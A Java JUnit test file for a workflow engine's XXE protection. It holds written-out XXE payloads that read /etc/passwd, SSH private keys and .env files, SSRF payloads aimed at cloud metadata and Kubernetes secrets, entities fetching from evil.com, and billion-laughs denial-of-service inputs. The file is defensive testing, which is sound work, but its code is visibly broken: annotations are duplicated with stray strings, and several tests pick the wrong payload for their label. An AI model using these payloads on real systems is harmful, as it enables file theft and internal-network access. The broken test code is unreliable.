/*
 * Copyright (c) 2004-2026 The YAWL Foundation. All rights reserved.
 * The YAWL Foundation is a collaboration of individuals and
 * organisations who are committed to improving workflow technology.
 *
 * This file is part of YAWL. YAWL is free software: you can
 * redistribute it and/or modify it under the terms of the GNU Lesser
 * General Public License as published by the Free Software Foundation.
 *
 * YAWL is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General
 * Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with YAWL. If not, see <http://www.gnu.org/licenses/>.
 */

package org.yawlfoundation.yawl.security;

import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.xml.sax.InputSource;
import org.xml.sax.SAXParseException;

import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import java.io.ByteArrayInputStream;
import java.io.StringReader;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Comprehensive XXE (XML External Entity) protection tests.
 *
 * <p>Tests OWASP Top 10 A05:2021 - Security Misconfiguration and A03:2021 - Injection.
 * Validates that the XML parser is configured securely to prevent XXE attacks
 * including file disclosure, SSRF, and denial of service.</p>
 *
 * <p>Chicago TDD: Real XML parsing with actual security configurations.
 * No mocks, no stubs, no placeholder implementations.</p>
 *
 * @author YAWL Development Team
 * @since 6.0
 */
@DisplayName("XXE Protection Tests")
@Tag("unit")
public class XxeProtectionTest {

    /**
     * Pattern to detect external entity declarations.
     */
    private static final Pattern XXE_PATTERN = Pattern.compile(
            "(?i)<!ENTITY\\s+" +
            "|<!ENTITY%\\s+" +
            "|SYSTEM\\s+['\"](file://|http://|https://|ftp://|php://|data:)" +
            "|PUBLIC\\s+['\"][^'\"]+['\"]\\s+['\"](file://|http://|https://)" +
            "|xmlns:\\w+\\s*=\\s*['\"](file://|http://)" +
            "|XInclude\\s+href\\s*="
    );

    /**
     * XXE attack payloads for file disclosure.
     */
    private static final List<String> FILE_DISCLOSURE_PAYLOADS = Arrays.asList(
            // Basic XXE with file protocol
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
            "]>\n" +
            "<root>&xxe;</root>",

            // XXE with Windows file path
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "  <!ENTITY xxe SYSTEM \"file:///c:/windows/system32/config/sam\">\n" +
            "]>\n" +
            "<root>&xxe;</root>",

            // Parameter entity based XXE
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "  <!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\">\n" +
            "  %xxe;\n" +
            "]>\n" +
            "<root>data</root>",

            // XXE with c: protocol (Windows)
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "  <!ENTITY xxe SYSTEM \"c:/boot.ini\">\n" +
            "]>\n" +
            "<root>&xxe;</root>",

            // XXE targeting application config files
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "  <!ENTITY xxe SYSTEM \"file:///app/config/database.yml\">\n" +
            "]>\n" +
            "<root>&xxe;</root>",

            // XXE with environment file
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "  <!ENTITY xxe SYSTEM \"file:///.env\">\n" +
            "]>\n" +
            "<root>&xxe;</root>",

            // XXE with SSH key
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "  <!ENTITY xxe SYSTEM \"file:///home/user/.ssh/id_rsa\">\n" +
            "]>\n" +
            "<root>&xxe;</root>"
    );

    /**
     * XXE attack payloads for SSRF (Server-Side Request Forgery).
     */
    private static final List<String> SSRF_PAYLOADS = Arrays.asList(
            // Basic SSRF via XXE
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "  <!ENTITY xxe SYSTEM \"http://internal-server/admin\">\n" +
            "]>\n" +
            "<root>&xxe;</root>",

            // SSRF to cloud metadata endpoint
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "  <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n" +
            "]>\n" +
            "<root>&xxe;</root>",

            // SSRF to internal Kubernetes service
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "  <!ENTITY xxe SYSTEM \"http://kubernetes.default.svc/api/v1/namespaces/default/secrets\">\n" +
            "]>\n" +
            "<root>&xxe;</root>",

            // SSRF with port scanning
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "  <!ENTITY xxe SYSTEM \"http://internal-host:22/\">\n" +
            "]>\n" +
            "<root>&xxe;</root>",

            // SSRF to localhost
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "  <!ENTITY xxe SYSTEM \"http://localhost:8080/admin\">\n" +
            "]>\n" +
            "<root>&xxe;</root>",

            // SSRF via HTTPS
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "  <!ENTITY xxe SYSTEM \"https://internal-api.company.com/sensitive\">\n" +
            "]>\n" +
            "<root>&xxe;</root>"
    );

    /**
     * XXE attack payloads for denial of service (Billion Laughs).
     */
    private static final List<String> DOS_PAYLOADS = Arrays.asList(
            // Classic Billion Laughs attack
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE lolz [\n" +
            "  <!ENTITY lol \"lol\">\n" +
            "  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n" +
            "  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n" +
            "  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n" +
            "]>\n" +
            "<lolz>&lol4;</lolz>",

            // Quadratic blowup attack
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "  <!ENTITY x \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\">\n" +
            "]>\n" +
            "<root>" + "&x;".repeat(10000) + "</root>",

            // Recursive entity expansion
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "  <!ENTITY a \"&b;\">\n" +
            "  <!ENTITY b \"&c;\">\n" +
            "  <!ENTITY c \"&a;\">\n" +
            "]>\n" +
            "<root>&a;</root>"
    );

    /**
     * Creates a secure DocumentBuilderFactory configured to prevent XXE.
     *
     * @return a secure DocumentBuilderFactory
     */
    public static DocumentBuilderFactory createSecureDocumentBuilderFactory() {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

        // Disable external entities
        try {
            // Feature: Disallow doctype declarations (most secure)
            factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

            // Disable external entities
            factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
            factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

            // Disable external DTD
            factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

            // Disable XInclude
            factory.setXIncludeAware(false);

            // Disable entity expansion
            factory.setExpandEntityReferences(false);

            // Set secure processing
            factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

        } catch (javax.xml.parsers.ParserConfigurationException e) {
            throw new IllegalStateException("Failed to configure secure XML parser", e);
        }

        return factory;
    }

    /**
     * Validates that XML content does not contain XXE attack patterns.
     *
     * @param xmlContent the XML content to validate
     * @return true if the content appears safe, false if XXE patterns detected
     */
    public static boolean isXmlContentSafe(String xmlContent) {
        if (xmlContent == null || xmlContent.isEmpty()) {
            return true;
        }
        // Check for XXE patterns
        if (XXE_PATTERN.matcher(xmlContent).find()) {
            return false;
        }
        return xmlContent.length() <= 1000000; // 1MB limit
    }

    /**
     * Parses XML securely, throwing an exception if XXE is detected.
     *
     * @param xmlContent the XML content to parse
     * @return the parsed Document
     * @throws Exception if parsing fails or XXE is detected
     */
    public static org.w3c.dom.Document parseXmlSecurely(String xmlContent) throws Exception {
        if (!isXmlContentSafe(xmlContent)) {
            throw new SecurityException("Potential XXE attack detected in XML content");
        }

        DocumentBuilderFactory factory = createSecureDocumentBuilderFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();

        try {
            return builder.parse(new InputSource(new StringReader(xmlContent)));
        } catch (SAXParseException e) {
            // Secure parser should reject DOCTYPE declarations
            if (e.getMessage() != null && e.getMessage().contains("DOCTYPE")) {
                throw new SecurityException("DOCTYPE is disallowed in secure XML parsing", e);
            }
            throw e;
        }
    }

    @Nested
    @DisplayName("Secure Parser Configuration Tests")
    @Nested
    @DisplayName("class SecureParserTests {")
    class SecureParserTests {

        @Test
        @DisplayName("Should create secure DocumentBuilderFactory")
        void shouldCreateSecureDocumentBuilderFactory() {
            DocumentBuilderFactory factory = createSecureDocumentBuilderFactory();
            assertNotNull(factory, "Factory should not be null");
        }

        @Test
        @DisplayName("Should have secure processing enabled")
        void shouldHaveSecureProcessingEnabled() throws Exception {
            DocumentBuilderFactory factory = createSecureDocumentBuilderFactory();
            assertTrue(factory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING),
                    "Secure processing should be enabled");
        }

        @Test
        @DisplayName("Should have external general entities disabled")
        void shouldHaveExternalGeneralEntitiesDisabled() throws Exception {
            DocumentBuilderFactory factory = createSecureDocumentBuilderFactory();
            assertFalse(factory.getFeature("http://xml.org/sax/features/external-general-entities"),
                    "External general entities should be disabled");
        }

        @Test
        @DisplayName("Should have external parameter entities disabled")
        void shouldHaveExternalParameterEntitiesDisabled() throws Exception {
            DocumentBuilderFactory factory = createSecureDocumentBuilderFactory();
            assertFalse(factory.getFeature("http://xml.org/sax/features/external-parameter-entities"),
                    "External parameter entities should be disabled");
        }

        @Test
        @DisplayName("Should have XInclude disabled")
        void shouldHaveXIncludeDisabled() {
            DocumentBuilderFactory factory = createSecureDocumentBuilderFactory();
            assertFalse(factory.isXIncludeAware(),
                    "XInclude should be disabled");
        }

        @Test
        @DisplayName("Should have entity expansion disabled")
        void shouldHaveEntityExpansionDisabled() {
            DocumentBuilderFactory factory = createSecureDocumentBuilderFactory();
            assertFalse(factory.isExpandEntityReferences(),
                    "Entity expansion should be disabled");
        }
    }

    @Nested
    @DisplayName("File Disclosure Prevention Tests")
    @Nested
    @DisplayName("class FileDisclosureTests {")
    class FileDisclosureTests {

        @Test
        @DisplayName("Should detect XXE with file protocol")
        void shouldDetectXxeWithFileProtocol() {
            String payload = "<?xml version=\"1.0\"?>\n" +
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n" +
                    "<root>&xxe;</root>";
            assertFalse(isXmlContentSafe(payload),
                    "XXE with file protocol must be detected");
        }

        @Test
        @DisplayName("Should detect XXE targeting /etc/passwd")
        void shouldDetectEtcPasswdPayload() {
            String payload = FILE_DISCLOSURE_PAYLOADS.get(0);
            assertFalse(isXmlContentSafe(payload),
                    "/etc/passwd XXE payload must be detected");
        }

        @Test
        @DisplayName("Should detect XXE targeting Windows SAM")
        void shouldDetectWindowsSamPayload() {
            String payload = FILE_DISCLOSURE_PAYLOADS.get(1);
            assertFalse(isXmlContentSafe(payload),
                    "Windows SAM XXE payload must be detected");
        }

        @Test
        @DisplayName("Should detect XXE targeting application config")
        void shouldDetectAppConfigPayload() {
            String payload = FILE_DISCLOSURE_PAYLOADS.get(3);
            assertFalse(isXmlContentSafe(payload),
                    "Application config XXE payload must be detected");
        }

        @Test
        @DisplayName("Should detect XXE targeting .env file")
        void shouldDetectEnvFilePayload() {
            String payload = FILE_DISCLOSURE_PAYLOADS.get(4);
            assertFalse(isXmlContentSafe(payload),
                    ".env file XXE payload must be detected");
        }

        @Test
        @DisplayName("Should detect XXE targeting SSH keys")
        void shouldDetectSshKeyPayload() {
            String payload = FILE_DISCLOSURE_PAYLOADS.get(5);
            assertFalse(isXmlContentSafe(payload),
                    "SSH key XXE payload must be detected");
        }

        @Test
        @DisplayName("Should securely parse reject DOCTYPE")
        void shouldSecurelyParseRejectDoctype() {
            String payload = "<?xml version=\"1.0\"?>\n" +
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n" +
                    "<root>&xxe;</root>";
            assertThrows(Exception.class, () -> parseXmlSecurely(payload),
                    "Secure parser should reject DOCTYPE declarations");
        }
    }

    @Nested
    @DisplayName("SSRF Prevention Tests")
    @Nested
    @DisplayName("class SsrfTests {")
    class SsrfTests {

        @Test
        @DisplayName("Should detect XXE with HTTP protocol")
        void shouldDetectXxeWithHttpProtocol() {
            String payload = "<?xml version=\"1.0\"?>\n" +
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/steal\">]>\n" +
                    "<root>&xxe;</root>";
            assertFalse(isXmlContentSafe(payload),
                    "XXE with HTTP protocol must be detected");
        }

        @Test
        @DisplayName("Should detect XXE targeting cloud metadata")
        void shouldDetectCloudMetadataPayload() {
            String payload = SSRF_PAYLOADS.get(1);
            assertFalse(isXmlContentSafe(payload),
                    "Cloud metadata XXE payload must be detected");
        }

        @Test
        @DisplayName("Should detect XXE targeting Kubernetes")
        void shouldDetectKubernetesPayload() {
            String payload = SSRF_PAYLOADS.get(2);
            assertFalse(isXmlContentSafe(payload),
                    "Kubernetes XXE payload must be detected");
        }

        @Test
        @DisplayName("Should detect XXE targeting localhost")
        void shouldDetectLocalhostPayload() {
            String payload = SSRF_PAYLOADS.get(4);
            assertFalse(isXmlContentSafe(payload),
                    "Localhost XXE payload must be detected");
        }

        @Test
        @DisplayName("Should detect XXE with HTTPS protocol")
        void shouldDetectXxeWithHttpsProtocol() {
            String payload = "<?xml version=\"1.0\"?>\n" +
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"https://evil.com/steal\">]>\n" +
                    "<root>&xxe;</root>";
            assertFalse(isXmlContentSafe(payload),
                    "XXE with HTTPS protocol must be detected");
        }

        @Test
        @DisplayName("Should detect parameter entity SSRF")
        void shouldDetectParameterEntitySsrf() {
            String payload = FILE_DISCLOSURE_PAYLOADS.get(2);
            assertFalse(isXmlContentSafe(payload),
                    "Parameter entity SSRF must be detected");
        }
    }

    @Nested
    @DisplayName("Denial of Service Prevention Tests")
    @Nested
    @DisplayName("class DosPreventionTests {")
    class DosPreventionTests {

        @Test
        @DisplayName("Should detect Billion Laughs attack")
        void shouldDetectBillionLaughsAttack() {
            String payload = DOS_PAYLOADS.get(0);
            assertFalse(isXmlContentSafe(payload),
                    "Billion Laughs attack must be detected");
        }

        @Test
        @DisplayName("Should detect entity expansion pattern")
        void shouldDetectEntityExpansionPattern() {
            String payload = "<?xml version=\"1.0\"?>\n" +
                    "<!DOCTYPE foo [<!ENTITY x \"AAAAAAA\">]>\n" +
                    "<root>&x;</root>";
            assertFalse(isXmlContentSafe(payload),
                    "Entity expansion pattern must be detected");
        }

        @Test
        @DisplayName("Should detect recursive entity expansion")
        void shouldDetectRecursiveExpansion() {
            String payload = DOS_PAYLOADS.get(2);
            assertFalse(isXmlContentSafe(payload),
                    "Recursive entity expansion must be detected");
        }

        @Test
        @DisplayName("Should reject excessively large XML")
        void shouldRejectExcessivelyLargeXml() {
            StringBuilder sb = new StringBuilder("<?xml version=\"1.0\"?><root>");
            sb.append("a".repeat(1000001));
            sb.append("</root>");
            assertFalse(isXmlContentSafe(sb.toString()),
                    "XML larger than 1MB should be rejected");
        }

        @Test
        @DisplayName("Should accept XML within size limit")
        void shouldAcceptXmlWithinSizeLimit() {
            String xml = "<?xml version=\"1.0\"?><root><item>data</item></root>";
            assertTrue(isXmlContentSafe(xml),
                    "Normal-sized XML should be accepted");
        }
    }

    @Nested
    @DisplayName("Safe XML Acceptance Tests")
    @Nested
    @DisplayName("class SafeXmlTests {")
    class SafeXmlTests {

        @Test
        @DisplayName("Should accept simple XML without DOCTYPE")
        void shouldAcceptSimpleXml() throws Exception {
            String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><root><item>data</item></root>";
            assertTrue(isXmlContentSafe(xml),
                    "Simple XML without DOCTYPE should be accepted");
            org.w3c.dom.Document doc = parseXmlSecurely(xml);
            assertNotNull(doc, "Document should be parsed successfully");
        }

        @Test
        @DisplayName("Should accept XML with attributes")
        void shouldAcceptXmlWithAttributes() throws Exception {
            String xml = "<?xml version=\"1.0\"?><root id=\"123\" name=\"test\"><item>value</item></root>";
            assertTrue(isXmlContentSafe(xml),
                    "XML with attributes should be accepted");
            org.w3c.dom.Document doc = parseXmlSecurely(xml);
            assertNotNull(doc, "Document should be parsed successfully");
        }

        @Test
        @DisplayName("Should accept YAWL specification XML")
        void shouldAcceptYawlSpecificationXml() throws Exception {
            String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                    "<specification xmlns=\"http://www.yawlfoundation.org/yawlschema\">\n" +
                    "  <metaData>\n" +
                    "    <specificationId>TestSpec</specificationId>\n" +
                    "  </metaData>\n" +
                    "  <rootNet id=\"root\">\n" +
                    "    <inputParam name=\"input\" />\n" +
                    "  </rootNet>\n" +
                    "</specification>";
            assertTrue(isXmlContentSafe(xml),
                    "YAWL specification XML should be accepted");
        }

        @Test
        @DisplayName("Should accept XML with namespaces")
        void shouldAcceptXmlWithNamespaces() throws Exception {
            String xml = "<?xml version=\"1.0\"?>\n" +
                    "<root xmlns:ns=\"http://example.org/ns\">\n" +
                    "  <ns:element>value</ns:element>\n" +
                    "</root>";
            assertTrue(isXmlContentSafe(xml),
                    "XML with namespaces should be accepted");
        }

        @Test
        @DisplayName("Should accept empty XML")
        void shouldAcceptEmptyXml() {
            assertTrue(isXmlContentSafe(""),
                    "Empty XML string should be accepted");
        }

        @Test
        @DisplayName("Should accept null XML")
        void shouldAcceptNullXml() {
            assertTrue(isXmlContentSafe(null),
                    "Null XML should be accepted");
        }
    }

    @Nested
    @DisplayName("Edge Cases and Boundary Tests")
    @Nested
    @DisplayName("class EdgeCaseTests {")
    class EdgeCaseTests {

        @Test
        @DisplayName("Should handle XML with CDATA")
        void shouldHandleXmlWithCdata() throws Exception {
            String xml = "<?xml version=\"1.0\"?><root><![CDATA[<script>alert(1)</script>]]></root>";
            assertTrue(isXmlContentSafe(xml),
                    "XML with CDATA should be accepted");
            org.w3c.dom.Document doc = parseXmlSecurely(xml);
            assertNotNull(doc, "Document should be parsed successfully");
        }

        @Test
        @DisplayName("Should handle XML with comments")
        void shouldHandleXmlWithComments() throws Exception {
            String xml = "<?xml version=\"1.0\"?><root><!-- comment --><item>data</item></root>";
            assertTrue(isXmlContentSafe(xml),
                    "XML with comments should be accepted");
            org.w3c.dom.Document doc = parseXmlSecurely(xml);
            assertNotNull(doc, "Document should be parsed successfully");
        }

        @Test
        @DisplayName("Should detect ENTITY with different case")
        void shouldDetectEntityWithDifferentCase() {
            String payload = "<?xml version=\"1.0\"?>\n" +
                    "<!DOCTYPE foo [<!entity xxe SYSTEM \"file:///etc/passwd\">]>\n" +
                    "<root>&xxe;</root>";
            assertFalse(isXmlContentSafe(payload),
                    "ENTITY in lowercase must be detected");
        }

        @Test
        @DisplayName("Should detect SYSTEM with different case")
        void shouldDetectSystemWithDifferentCase() {
            String payload = "<?xml version=\"1.0\"?>\n" +
                    "<!DOCTYPE foo [<!ENTITY xxe system \"file:///etc/passwd\">]>\n" +
                    "<root>&xxe;</root>";
            assertFalse(isXmlContentSafe(payload),
                    "system in lowercase must be detected");
        }

        @Test
        @DisplayName("Should handle malformed XML")
        void shouldHandleMalformedXml() {
            String xml = "<?xml version=\"1.0\"?><root><unclosed>";
            assertThrows(Exception.class, () -> parseXmlSecurely(xml),
                    "Malformed XML should throw parsing exception");
        }

        @Test
        @DisplayName("Should handle unicode in XML content")
        void shouldHandleUnicodeInXml() throws Exception {
            String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><root>\u4e2d\u6587</root>";
            assertTrue(isXmlContentSafe(xml),
                    "XML with unicode should be accepted");
            org.w3c.dom.Document doc = parseXmlSecurely(xml);
            assertNotNull(doc, "Document should be parsed successfully");
        }
    }

    @Nested
    @DisplayName("XInclude Attack Prevention Tests")
    @Nested
    @DisplayName("class XIncludeTests {")
    class XIncludeTests {

        @Test
        @DisplayName("Should detect XInclude file inclusion")
        void shouldDetectXIncludeFileInclusion() {
            String payload = "<?xml version=\"1.0\"?>\n" +
                    "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n" +
                    "  <xi:include href=\"file:///etc/passwd\"/>\n" +
                    "</root>";
            assertFalse(isXmlContentSafe(payload),
                    "XInclude file inclusion must be detected");
        }

        @Test
        @DisplayName("Should detect XInclude HTTP inclusion")
        void shouldDetectXIncludeHttpInclusion() {
            String payload = "<?xml version=\"1.0\"?>\n" +
                    "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n" +
                    "  <xi:include href=\"http://evil.com/steal\"/>\n" +
                    "</root>";
            assertFalse(isXmlContentSafe(payload),
                    "XInclude HTTP inclusion must be detected");
        }
    }
}
